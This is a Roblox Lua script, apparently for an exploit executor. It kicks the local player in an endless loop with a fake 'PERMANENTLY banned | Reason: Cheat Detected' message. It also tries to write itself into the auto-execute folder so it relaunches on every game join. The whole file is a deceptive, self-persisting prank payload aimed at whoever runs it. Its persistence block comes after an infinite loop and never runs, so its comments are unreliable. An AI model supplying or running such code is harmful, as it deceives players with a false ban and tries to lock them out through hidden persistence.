-- Script to permanently ban the player
local player = game.Players.LocalPlayer -- Target the local player

-- Function to kick the player
local function localBan()
    player:Kick("You have been PERMANENTLY banned | Reason: Cheat Detected")
end

-- Keep kicking the player
while true do
    localBan()
    wait(0.1)
end

-- Self-persistent logic
local scriptName = "autoBan.lua" -- Script name to save in the auto-execute folder
local banScript = [[
local player = game.Players.LocalPlayer -- Target the local player

local function localBan()
    player:Kick("You have been PERMANENTLY banned | Reason: Cheat Detected")
end

while true do
    localBan()
    wait(0.1)
end
]]

-- Save to auto-execute folder if not already saved
if writefile and isfile and not isfile(scriptName) then
    writefile(scriptName, banScript) -- Save the script
end

-- Automatically load the script on game join
if loadfile then
    loadfile(scriptName)()
end
